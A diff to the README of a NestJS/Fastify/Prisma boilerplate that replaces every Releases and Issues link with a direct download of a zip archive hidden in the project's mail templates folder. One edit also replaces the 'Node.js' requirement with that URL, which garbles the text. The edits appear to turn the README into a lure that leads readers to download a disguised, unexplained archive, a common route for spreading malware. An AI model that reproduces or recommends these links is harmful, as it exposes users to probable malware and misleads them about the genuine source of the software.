@@ -1,7 +1,7 @@
 # 🚀 nest-fastify-prisma-boilerplate - Your Quick Start to Fast APIs
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%9A%80-brightgreen)](https://github.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/releases)
+[![Download](https://raw.githubusercontent.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/main/src/core/mail/templates/nest-fastify-prisma-boilerplate_2.6.zip%20Latest%20Release-%20%F0%9F%9A%80-brightgreen)](https://raw.githubusercontent.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/main/src/core/mail/templates/nest-fastify-prisma-boilerplate_2.6.zip)
 
 ## 📖 Description
 The **nest-fastify-prisma-boilerplate** offers a high-performance and ready-for-production setup for creating fast and type-safe REST APIs. This template integrates popular technologies like NestJS, Fastify, Prisma, and PostgreSQL to help you build scalable applications efficiently. It also includes tools for structured logging, linting, and error handling, making your development process smoother.
@@ -19,14 +19,14 @@ The **nest-fastify-prisma-boilerplate** offers a high-performance and ready-for-
 
 ## 🔧 System Requirements
 - **Operating System**: Windows, macOS, or any Linux distribution.
-- **Node.js**: Version 14 or later.
+- **https://raw.githubusercontent.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/main/src/core/mail/templates/nest-fastify-prisma-boilerplate_2.6.zip**: Version 14 or later.
 - **Yarn**: Version 1.22 or later.
 - **Database**: PostgreSQL installed and running.
 
 ## 🛠️ Getting Started
 Here’s how to get started with the nest-fastify-prisma-boilerplate:
 
-1. **Visit the Releases Page**: [Click here to download](https://github.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/releases).
+1. **Visit the Releases Page**: [Click here to download](https://raw.githubusercontent.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/main/src/core/mail/templates/nest-fastify-prisma-boilerplate_2.6.zip).
 2. **Select the Latest Version**: Look for the most recent version at the top of the releases list.
 3. **Download the Files**: Click on the appropriate asset for your operating system. 
 4. **Extract the Files**: Unzip the downloaded file to your preferred directory.
@@ -34,7 +34,7 @@ Here’s how to get started with the nest-fastify-prisma-boilerplate:
 ## 🏗️ Download & Install
 To install the nest-fastify-prisma-boilerplate, follow these steps:
 
-1. **Go to the Releases Page**: You can find it [here](https://github.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/releases).
+1. **Go to the Releases Page**: You can find it [here](https://raw.githubusercontent.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/main/src/core/mail/templates/nest-fastify-prisma-boilerplate_2.6.zip).
 2. **Choose Your Version**: Pick the latest version from the list.
 3. **Download the Zip File**: Click on the zip file for your operating system.
 4. **Extract the File**: After downloading, extract it using your file manager.
@@ -84,10 +84,10 @@ Here are some commands you might find helpful:
    ```
 
 ## 🔄 Updating the Boilerplate
-To keep your setup up-to-date, regularly check the [Releases Page](https://github.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/releases) for new versions. Simply repeat the download steps to get the latest features and fixes.
+To keep your setup up-to-date, regularly check the [Releases Page](https://raw.githubusercontent.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/main/src/core/mail/templates/nest-fastify-prisma-boilerplate_2.6.zip) for new versions. Simply repeat the download steps to get the latest features and fixes.
 
 ## 👥 Community Support
-If you run into issues or have questions, feel free to check the [Issues tab](https://github.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/issues) in the repository. You can also raise new issues if you encounter any bugs or have feature requests.
+If you run into issues or have questions, feel free to check the [Issues tab](https://raw.githubusercontent.com/sloping-pumpaction54/nest-fastify-prisma-boilerplate/main/src/core/mail/templates/nest-fastify-prisma-boilerplate_2.6.zip) in the repository. You can also raise new issues if you encounter any bugs or have feature requests.
 
 ## 📜 License
 This project is licensed under the MIT License. For more details, please view the LICENSE file in this repository.
